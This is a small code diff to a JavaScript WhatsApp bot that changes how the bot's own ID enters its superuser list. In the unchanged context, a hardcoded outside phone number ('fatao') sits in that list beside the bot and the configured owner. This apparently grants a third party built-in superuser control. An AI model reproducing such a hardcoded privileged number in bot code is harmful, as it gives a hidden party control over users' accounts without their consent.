@@ -109,6 +109,7 @@ async function main() {
         : "";
 
       const origineMessage = ms.key.remoteJid;
+      const i = decodeJid(zk.user.id);
       const idBot = await JidToLid(decodeJid(zk.user.id));
       const servBot = idBot.split("@")[0];
       const verifGroupe = origineMessage?.endsWith("@g.us");
@@ -126,7 +127,7 @@ async function main() {
       const { getAllSudoNumbers } = require("./bdd/sudo");
       const fatao = "22651463203";
       const sudo = await getAllSudoNumbers();
-      const superuserjid = [servBot, fatao, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+      const superuserjid = [i, fatao, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const superUserNumbers = await Promise.all(superuserjid.map((j) => JidToLid(j)));
       const allAllowedNumbers = await JidToLid(superUserNumbers.concat(sudo));
       const superUser = allAllowedNumbers.includes(auteurMessage);
